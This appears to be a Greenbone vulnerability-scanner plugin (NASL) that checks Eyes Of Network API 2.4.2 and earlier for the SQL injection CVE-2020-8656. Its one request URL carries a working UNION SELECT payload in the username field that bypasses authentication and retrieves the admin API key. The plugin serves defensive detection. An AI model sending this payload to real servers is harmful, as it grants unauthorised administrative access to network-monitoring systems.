# SPDX-FileCopyrightText: 2020 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:eyes_of_network:eyes_of_network";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.143506");
  script_version("2025-09-10T05:38:24+0000");
  script_tag(name:"last_modification", value:"2025-09-10 05:38:24 +0000 (Wed, 10 Sep 2025)");
  script_tag(name:"creation_date", value:"2020-02-11 08:05:54 +0000 (Tue, 11 Feb 2020)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"severity_vector", value:"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2021-02-23 15:07:00 +0000 (Tue, 23 Feb 2021)");

  script_cve_id("CVE-2020-8656");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Eyes Of Network (EON) <= 2.4.2 SQLi Vulnerability - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2020 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_eyesofnetwork_consolidation.nasl");
  script_mandatory_keys("eyesofnetwork/api/detected");
  script_require_ports("Services/www", 80);

  script_tag(name:"summary", value:"Eyes Of Network (EON) is prone to an SQL injection (SQLi)
  vulnerability over the API.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"Eyes Of Network (EON) is prone to an SQL injection vulnerability
  allowing an unauthenticated attacker to perform various tasks such as authentication bypass.");

  script_tag(name:"affected", value:"Eyes Of Network API version 2.4.2 and probably prior.");

  script_tag(name:"solution", value:"See the referenced vendor advisories for a solution.");

  script_xref(name:"URL", value:"https://github.com/EyesOfNetworkCommunity/eonapi/issues/16");
  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/156266/EyesOfNetwork-5.3-Remote-Code-Execution.html");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

if (!port = get_app_port(cpe: CPE, service: "www"))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

url = dir + "/eonapi/getApiKey?&username=%27%20union%20select%201,%27admin%27,%271c85d47ff80b5ff2a4dd577e8e5f8e9d%27,0,0,1,1,8%20or%20%27&password=h4knet";

if (http_vuln_check(port: port, url: url, pattern: '"EONAPI_KEY": "[a-f0-9]+"',
                    extra_check: '"http_code": "200 OK"',check_header: TRUE)) {
  report = "It was possible to obtain EONAPI_KEY for the user 'admin' at " +
           http_report_vuln_url(port: port, url: url, url_only: TRUE);
  security_message(port: port, data: report);
  exit(0);
}

exit(99);
